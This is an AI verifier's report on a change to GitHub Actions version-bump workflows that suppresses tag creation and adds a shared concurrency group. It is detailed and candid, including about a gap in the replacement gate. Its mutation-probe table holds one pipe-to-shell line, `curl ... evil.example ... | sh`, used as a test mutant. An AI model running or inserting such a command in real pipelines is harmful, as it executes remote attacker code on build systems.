---
phase: quick-260909-rll
verified: 2026-09-09T21:05:00Z
status: human_needed
score: 9/10 must-haves verified
covered_files:
  - ".github/workflows/auto-update.yml"
  - ".github/workflows/base-image-update.yml"
  - ".planning/quick/stage-4-depends-on-stage-1-same-workflow-files-fix-the-tag-o/260909-rll-PLAN.md"
  - ".planning/quick/stage-4-depends-on-stage-1-same-workflow-files-fix-the-tag-o/260909-rll-SUMMARY.md"
  - "internal/update-version.py"
covered_digest: "v1:sha256:6d94771a947df71c5953446f7d7c36b6493148a10c49fea462e947d3158f332c"
behavior_unverified: 1
overrides_applied: 0
warnings:
  - finding: "The GATE-T1-14 replacement triple is narrower but LEAKY, not 'strictly stronger'. A non-comment (executable) shell line inserted between the two frozen anchor comments passes all seven T1 gates. Demonstrated by mutation (see Mutation Probe table)."
    category: verification-strength
    impact: "No functional defect in the shipped change. The PLAN's <sibling_supersession> and the SUMMARY both assert 'strictly stronger, not weaker'; that claim is false as written."
    harden: "Move Region A's end anchor down one line: pin `while IFS= read -r upstream_file; do` .. the `--check-release` comment INCLUSIVE (currently it stops at the line before the AUTO-02 comment). That closes the hole completely and leaves only the purely-inserted comment lines unpinned."
info:
  - finding: "update-version.py's new tag-push line reads 'A build runs only if that add-on's build-<addon>.yml has an active tags: trigger'. Scoped to a tag-triggered build this is exact, but an operator can read it as 'no build happens at all', which is false: the `paths:` trigger is active for all nine add-ons and fires on the main push. The docstring two hundred lines up disambiguates; the CI-log line does not."
    harden: "One word: 'A tag-triggered build runs only if ...'."
  - finding: "Executor ledger entry #5 (unrun-verify, 'a real auto-update run creates no tag ... not reachable from a repo checkout') is over-broad. The MECHANISM is reachable and was proven here by a differential run in an isolated clone: --no-tag leaves the tag count at 47, omitting it creates meridian/v1.99.0-0 (48). Only the live-GitHub-run confirmation is unreachable."
behavior_unverified_items:
  - truth: "auto-update.yml and base-image-update.yml both declare concurrency group `addon-version-bump` with cancel-in-progress: false, SO the two bump workflows are mutually exclusive and neither can race the other's git push."
    test: "Trigger both workflows so they overlap (workflow_dispatch base-image-update while auto-update is mid-run, or vice versa). Watch the Actions tab."
    expected: "The second run enters status 'Queued / waiting for concurrency group addon-version-bump' and starts only after the first completes. Neither run is cancelled."
    why_human: "Concurrency-group serialization is enforced by GitHub's scheduler, not by anything in the checkout. Config presence and byte-identical group names are verified here; the queueing behaviour is only observable from two overlapping live runs. Matches the executor's own ledger entry #6, which is the correct disposition."
human_verification:
  - test: "Overlap the two bump workflows and confirm the second queues on group `addon-version-bump` rather than running concurrently or being cancelled."
    expected: "Second run shows 'waiting for concurrency group'; both eventually complete; no cancellation."
    why_human: "GitHub-scheduler behaviour, not observable from a repo checkout."
  - test: "After the next scheduled auto-update run that actually bumps an add-on, run `git ls-remote --tags origin | grep '<addon>/v'` and compare against the tag list from before the run."
    expected: "No new `<addon>/v<version>` tag appears. The bump lands as a `chore(<addon>): update to <version>` commit on main with the 3-file diff, and the build is requested by the dispatch step."
    why_human: "Requires a live scheduled run. The mechanism (--no-tag suppresses tag creation) IS proven locally in this report; only the end-to-end run is not."
---

# Quick 260909-rll Verification Report

**Item goal:** Fix the tag off-by-one and serialize the two bump workflows — (a) `--no-tag` on the
`update-version.py` call in `auto-update.yml` with a pre-bump-HEAD comment, (b) correct the
tag-push print and the `create_and_push_tag` docstring, (c) shared `addon-version-bump`
concurrency group in BOTH bump workflows, extending (not replacing) auto-update's 12-line
rationale comment.
**Verified:** 2026-09-09
**Status:** human_needed — 9/10 must-haves verified, 1 present-but-behaviour-unverified (live
GitHub serialization), 0 gaps
**Re-verification:** No — initial verification
**Tree verified:** merged HEAD `0e50dd9`; item commit `ce932fa`; baseline `c495cbc`

## Goal Achievement

### Observable Truths

| #   | Truth | Status | Evidence |
| --- | ----- | ------ | -------- |
| 1 | auto-update.yml creates no git tag: its single non-comment `update-version.py` invocation carries `--no-tag` | ✓ VERIFIED | `auto-update.yml:123` is the ONLY occurrence of `internal/update-version.py` in the file, comment lines included, and it ends `"$latest_version" --no-tag \|\| {`. **Behavioural differential in an isolated clone** (origin removed): `--no-tag --no-push` → tag count stays 47; same command without `--no-tag` → 48, `meridian/v1.99.0-0` created. Root cause independently reproduced: that control tag pointed at HEAD `55b5700`, whose `meridian/build.yaml` still read `1.68.0` while the working tree held `1.99.0`. |
| 2 | Both flanking loop regions are byte-identical to their pre-change baselines | ✓ VERIFIED | Recomputed on BOTH trees. Region A `c495cbc` lines 71-102 = merged lines 83-114 = `c1d953504308eca6…1677cecd20`. Region B `c495cbc` 106-139 = merged 124-157 = `bfa308db940b8973…65e99b4ec6`. Identical, not merely matching the plan's literal. |
| 3 | The unpinned window is bounded in SIZE, acceptance window derived from the run's real extent | ✓ VERIFIED (as written) — see WARNING | `awk` derives `r=8` from the actual contiguous comment run above line 123 (2 frozen anchors + 6 inserted); `3 ≤ 8 ≤ 8`; run contains `pre-bump` and `RELEASE.md`. The literal claim holds. The *window* `[115..123]` is 9 lines and only its comment run is bounded — see the Mutation Probe. |
| 4 | `update-version.py` never again asserts that pushing the tag produces a build | ✓ VERIFIED | `grep -c 'will trigger'` = 0, `grep -c 'tag is required'` = 0, `RELEASE.md` = 2, `Pushed tag: {tag}` = 1. New text states the `tags:`-trigger conditional and cites `.github/RELEASE.md`. Truth of the claim checked against the real config (below). |
| 5 | `create_and_push_tag`'s docstring separates `paths:` from `tags:` and drops the prerequisite claim | ✓ VERIFIED | Docstring hash `4e712b56…` ≠ pre-pin `1f1d918d…`; contains `paths:`, `tags:`, `RELEASE.md`, `Returns True on success.`. The removed sentence ("the HA supervisor cannot map the version to an image in ghcr.io") is gone from the diff. Both new claims measured TRUE (below). |
| 6 | `--no-tag` still parses before and after the positionals; argparse surface untouched | ✓ VERIFIED | Both orderings rc=0 with a clean `git status -- meridian`. `--help` lists `--no-tag` at 3 places. Argparse block (`add_argument`/`ArgumentParser`/`parse_args` lines, line numbers stripped) hashes `f7fb803a…` on BOTH `c495cbc` and merged. `--help` output byte-identical modulo `prog`. Signature line identical. `diff` reports exactly two changed hunks: 202-206→202-211 and 275→280-282. |
| 7 | Both workflows declare workflow-level `concurrency` group `addon-version-bump` with `cancel-in-progress: false`, **so** the two serialize | ⚠️ PRESENT_BEHAVIOR_UNVERIFIED | Config verified exactly: `yaml.safe_load` gives top-level keys `[name, on, concurrency, jobs]` in both files and `{'group': 'addon-version-bump', 'cancel-in-progress': False}` in both. `group:` lines byte-identical (`  group: addon-version-bump`), one occurrence per file, no other repo consumer. The **"so they serialize"** clause is a runtime scheduler invariant with no local observable — routed to live verification. |
| 8 | The original 12-line rationale comment survives verbatim and contiguous at the TOP of the run; the run is longer than 12 | ✓ VERIFIED | Lines 8-19 hash `0540d26f95b79491…263013eb0` (unchanged from `c495cbc`). `concurrency:` at 32; comment run `k=24`; frozen start `s=8` and `c-k=8`, so `s == c-k` → appended AFTER, not prepended before. Extension = lines 20-31. |
| 9 | The extension reconciles the frozen paragraph: names `--no-tag`, says no tag is created, points at the call-site comment | ✓ VERIFIED | Lines 28-31: "History note: this workflow now passes --no-tag and creates no tag at all, so the `<addon>/v<version>` tag-collision sentence above records the old behaviour rather than a live claim - see the call-site comment in the per-add-on loop below for why." |
| 10 | Every 260909-rlj gate over these two workflows still passes, with the single exception of GATE-T1-14 | ✓ VERIFIED | All 19 rlj `<automated>` gates extracted from `260909-rlj-PLAN.md` and re-executed on the merged tree: **18 GREEN, 1 RED** — and the red one is exactly `GATE-T1-14`. Full table below. |

**Score:** 9/10 truths verified (1 present, behaviour-unverified)

## Supersession Audit — is the replacement actually stronger?

**Honesty of the supersession: CONFIRMED.** Measured on both trees, not read from the SUMMARY:

| whole-loop sha256 | tree |
| --- | --- |
| `7b7356ab16e89075cb44bd9ae13b94df53580b4b33a10e3f308e15d4b6f2f8bc` | `c495cbc` (pre-item) — **exactly rlj's pin, so it was genuinely green before** |
| `cdaa8113a8f5e52c67778094835ba3feed0d278b39eb63ed8de03c2ef97780bb` | merged HEAD — matches the SUMMARY's stated post-value |

The pin could not survive: line 123 is inside the pinned region and is the line the item exists to
change. Region coverage is complete and contiguous — Region A `83..114`, window `115..123`,
Region B `124..157` — so no loop line is left both unpinned and unaccounted for.

### Mutation Probe (four mutants, all seven T1 gates run on each)

| Mutant | Result | Caught? |
| --- | --- | --- |
| Baseline (merged tree) | `A:P B:P C:P D:P E:P F:P(r=8) G:P` | n/a — all green |
| Tamper a line inside Region A (line 90) | `B:F` | ✓ caught |
| Tamper a line inside Region B (line 130) | `C:F` | ✓ caught |
| Remove ` --no-tag` from the call | `A:F` | ✓ caught |
| **Inject `curl -s https://evil.example/x \| sh` between the AUTO-02 anchor and the `--check-release` anchor** | `A:P B:P C:P D:P E:P F:P(r=7) G:P` | ✗ **NOT caught** |

**Verdict, plainly: the replacement is narrower and it is leaky. It is NOT "strictly stronger".**
rlj's whole-loop pin caught 100% of changes anywhere in the loop, including that injection. The
triple catches everything outside `[115..123]`, plus it adds a positive change-proof gate
(GATE-T1-D) that the old pin lacked — but it admits an arbitrary executable line at one specific
insertion point, because Region A stops *before* the AUTO-02 anchor rather than *after* the
`--check-release` anchor. `GATE-T1-F` does not close it: the run measured above the call simply
reads 7 instead of 8, still inside `3..8`. `GATE-T1-A` does not close it either, since the
injected line contains no `internal/update-version.py`.

Some loss of coverage was unavoidable — the item had to edit inside the region. This particular
loss was avoidable at zero cost: end Region A at the `--check-release` comment inclusive and the
only unpinned lines become pure comment text. Recorded as a WARNING, not a gap: the shipped change
is correct, and no `must_haves.truths` entry asserts "strictly stronger" (that wording lives in
`<sibling_supersession>` prose and was carried into the SUMMARY).

## Correctness of the Corrected Prose (is it TRUE, not merely changed?)

Measured independently across all nine `build-*.yml`:

| Claim in the new text | Measured | True? |
| --- | --- | --- |
| `tags:` active only for iac-runner, network-tools, terraform-bridge | active `tags:` in exactly those 3 (each at line 7, glob `<addon>/v*`) | ✓ |
| "six of the nine have it commented out" | `^\s*#\s*tags:` in exactly 6: authentik, coding-assistants, gatus, markdown-renderer, meridian, phone-logger | ✓ |
| `paths:` "active for all nine add-ons" | active `paths:` in 9/9, commented in 0/9 | ✓ |
| Pointer target `.github/RELEASE.md` carries a per-add-on table | exists (10,257 B); table at lines 35-46 lists 3 `**active**` + 6 `disabled`, `paths:` active for all nine — matches my measurement exactly | ✓ (key link not dangling) |
| Off-by-TWO example, not "the previous version" | `meridian/v1.68.0-0` → `9f45b96` → `build.yaml VERSION: "1.66.0"`; `meridian/v1.67.0-0` → `8c31d33` → `"1.66.0"` | ✓ |
| Comment avoids the phrase "the previous version" | `grep -c 'the previous version'` = 0 in both edited files; line 120 says "an older version" and cites `9f45b96` / `1.66.0` | ✓ |

Residual imprecision (ℹ️ Info, not a gap): the CI-log line "A build runs only if that add-on's
`build-<addon>.yml` has an active `tags:` trigger" is exact for a *tag-triggered* build but can be
read as denying builds altogether — the `paths:` trigger builds all nine on the main push. One word
fixes it: "A tag-triggered build runs only if …".

## Required Artifacts

| Artifact | Expected | Status | Details |
| --- | --- | --- | --- |
| `.github/workflows/auto-update.yml` | `--no-tag` + pre-bump comment; `group: addon-version-bump`; extended rationale | ✓ VERIFIED | +22/-2. Call at 123, comment run 117-122, group at 33, extension at 20-31. Parses; actionlint clean. |
| `internal/update-version.py` | corrected print + docstring, argparse untouched | ✓ VERIFIED | +19/-8 across exactly two hunks. `py_compile` rc=0. Argparse hash identical to baseline. |
| `.github/workflows/base-image-update.yml` | new workflow-level `concurrency` block above `jobs:` with ≥4 rationale lines | ✓ VERIFIED | +12/-0. 8 rationale lines (8-15), `concurrency:` at 16, `jobs:` at 20. Nothing inside `jobs:` changed. |

## Key Link Verification

| From | To | Via | Status | Details |
| --- | --- | --- | --- | --- |
| `auto-update.yml:123 --no-tag` | `update-version.py:425 if not args.no_tag:` | argparse `dest='no_tag'` (line 302) | ✓ WIRED | Guard at 411/425/444; differential clone run proves `create_and_push_tag` is not reached |
| `auto-update.yml group:` | `base-image-update.yml group:` | identical literal `addon-version-bump` | ✓ WIRED (config) | Byte-identical lines; 1 occurrence per file; runtime effect → live check |
| `update-version.py` tag-push output & docstring | `.github/RELEASE.md` per-add-on table | `RELEASE.md` cited ×2 | ✓ WIRED | Target exists and its table matches the measured trigger config |
| concurrency block position | rlj line-ordering gates inside `jobs:` | inserted above `jobs:` | ✓ WIRED | `d==p+1`, `k==d+1`, `d<e`, `b<w` re-measured green in both files |

## Behavioural Spot-Checks

| Behavior | Command | Result | Status |
| --- | --- | --- | --- |
| `--no-tag` suppresses tag creation | real (non-dry-run) `update-version.py meridian 1.99.0 --no-tag --no-push` in an isolated clone with origin removed | tags 47 → 47 | ✓ PASS |
| Control: omitting the flag DOES tag | same command without `--no-tag` | tags 47 → 48, `meridian/v1.99.0-0` created at HEAD `55b5700` whose `build.yaml` reads `1.68.0` | ✓ PASS (root cause reproduced) |
| `--no-tag` before positionals | `--no-tag --dry-run meridian 1.99.0` | rc=0, tree clean | ✓ PASS |
| `--no-tag` after positionals | `meridian 1.99.0 --no-tag --dry-run` | rc=0, tree clean | ✓ PASS |
| `--help` still lists the flag | `--help \| grep -c -- '--no-tag'` | 3 | ✓ PASS |
| Both workflows are valid YAML with top-level `concurrency` | `yaml.safe_load` | `[name, on, concurrency, jobs]`; group + `cancel-in-progress: False` in both | ✓ PASS |
| Latest-release actionlint | `docker run … rhysd/actionlint:latest` | rc=0, no findings | ✓ PASS |
| `py_compile` | `python3 -m py_compile internal/update-version.py` | rc=0 | ✓ PASS |
| Two workflows actually queue | — | needs two overlapping live GitHub runs | ? SKIP → human |

## Sibling rlj Gate Re-Run (all 19, on the merged tree)

| Gate | Result | Gate | Result |
| --- | --- | --- | --- |
| GATE-T1-1 | ✓ GREEN | GATE-T1-11 | ✓ GREEN |
| GATE-T1-2 | ✓ GREEN | GATE-T1-12 (`d==p+1`, `k==d+1`, `d<e`, `b<w`) | ✓ GREEN |
| GATE-T1-3 | ✓ GREEN | GATE-T1-13 | ✓ GREEN |
| GATE-T1-4 | ✓ GREEN | **GATE-T1-14 (loop pin `7b7356ab…`)** | **✗ RED — expected, documented** |
| GATE-T1-5 | ✓ GREEN | GATE-T3-1 (`! grep GH_REPO`) | ✓ GREEN |
| GATE-T1-6 | ✓ GREEN | GATE-T3-2 (`GH_TOKEN` single-match + position) | ✓ GREEN |
| GATE-T1-7 | ✓ GREEN | GATE-T3-3 (dispatch ordering) | ✓ GREEN |
| GATE-T1-8 | ✓ GREEN | GATE-T3-4 | ✓ GREEN |
| GATE-T1-9 | ✓ GREEN | **GATE-T3-5 (base-image loop pin)** | ✓ GREEN — recomputed `2dace2d53d8b7c7a697999e0db87256667bcfe245826ee88284ef74bdab419cc` |
| GATE-T1-10 | ✓ GREEN | | |

**Nothing is red beyond the one deliberately superseded gate.** The base-image loop pin
`2dace2d5…b419cc` is byte-intact, confirming the new `concurrency` block touched nothing inside
that file's `jobs:`. This item's own 20 gates were also re-run independently: all pass
(GATE-T1-A..G, T2-A..E, T3-A..J), with `r=8` and `k=24` matching the SUMMARY.

## Anti-Patterns Found

| File | Line | Pattern | Severity | Impact |
| --- | --- | --- | --- | --- |
| — | — | none | — | `TBD`/`FIXME`/`XXX` = 0 and `TODO`/`HACK`/`PLACEHOLDER` = 0 across all three modified files. No added line exceeds 119 chars; no tabs, no trailing whitespace. The only non-ASCII added byte is the pre-existing 🚀 emoji in the retained `Pushed tag: {tag}` print (mandated by L-4; the ASCII constraint applied to the workflow comments, which are pure ASCII). |

Pre-existing, correctly out of scope and not regressions of this item: 6 lines >119 chars in
`update-version.py` (none written here), and 22 repo-wide strict-shellcheck findings whose exit
code `lint.yml:94-95` swallows.

## Ledger Disposition Review

| Entry | Kind | Disposition | Verdict |
| --- | --- | --- | --- |
| #5 | unrun-verify — a real auto-update run creates no tag | "not reachable from a repo checkout" | **Partly wrong — over-broad.** The mechanism IS reachable and I proved it (differential clone run, 47→47 vs 47→48). Only the end-to-end live-run confirmation is unreachable. The entry should be narrowed to the live run; the code-level claim is now behaviourally verified. |
| #6 | unrun-verify — the two workflows actually queue | "needs two overlapping GitHub runs" | **Correct.** GitHub-scheduler behaviour, no local observable. This is the single item driving `status: human_needed`. |
| #7 | deviation — rlj GATE-T1-14 intentionally red | `7b7356ab` → `cdaa8113` | **Correct and honest** on the hashes and on the reason. The accompanying "strictly stronger" characterization in PLAN/SUMMARY is overstated — see the Mutation Probe. |

## Gaps Summary

**No gaps.** The item's three mandated deliverables are all present, wired and — where locally
observable — behaviourally proven:

- (a) `--no-tag` is on the only non-comment invocation, with a 6-line pre-bump-HEAD rationale
  comment citing the measured `9f45b96`/`1.66.0` pair and avoiding "the previous version". The
  suppression is proven by differential execution, and the original off-by-N defect was
  reproduced locally in an isolated clone.
- (b) Both prose corrections are not merely changed but **true** against the measured trigger
  configuration (3 active `tags:`, 6 commented, `paths:` active for all nine), and the
  `.github/RELEASE.md` they point at carries a table that matches. The argparse surface,
  `--help` output and `create_and_push_tag` signature are byte-identical to the baseline — prose
  only, exactly as scoped.
- (c) Both workflows carry the byte-identical shared group above `jobs:` with
  `cancel-in-progress: false`, and the frozen 12-line rationale block survives verbatim at the
  TOP of a 24-line run with the extension appended after it and reconciling it.

Two items remain open, neither a defect: one WARNING about the *strength of the replacement gate*
(fixable by moving one anchor), and one live-run confirmation that the shared group actually
queues.

---

_Verified: 2026-09-09_
_Verifier: Claude (gsd-verifier)_
